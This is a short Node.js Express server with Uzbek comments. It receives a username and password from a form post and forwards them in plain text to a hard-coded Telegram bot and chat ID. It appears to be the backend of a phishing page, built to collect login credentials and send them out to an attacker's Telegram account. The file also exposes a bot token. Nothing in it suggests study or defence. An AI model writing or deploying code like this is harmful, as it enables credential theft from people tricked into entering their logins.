import express from "express";

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Telegram ma'lumotlari
const BOT_TOKEN = "8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM";
const CHAT_ID = "7527317470";

// Forma yuborilganda ishlaydi
app.post("/send", async (req, res) => {
  const { username, password } = req.body;

  try {
    // Telegramga yuborish
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `📩 Yangi ma'lumot:\n👤 Username: ${username}\n🔑 Password: ${password}`
      })
    });

    if (!response.ok) {
      throw new Error(`Telegram API xatosi: ${response.status}`);
    }

    res.send("✅ Ma'lumot yuborildi!");
  } catch (err) {
    console.error("Xato:", err);
    res.status(500).send("❌ Xato yuz berdi");
  }
});

app.listen(3000, () => console.log("✅ Server ishlayapti 3000-portda"));
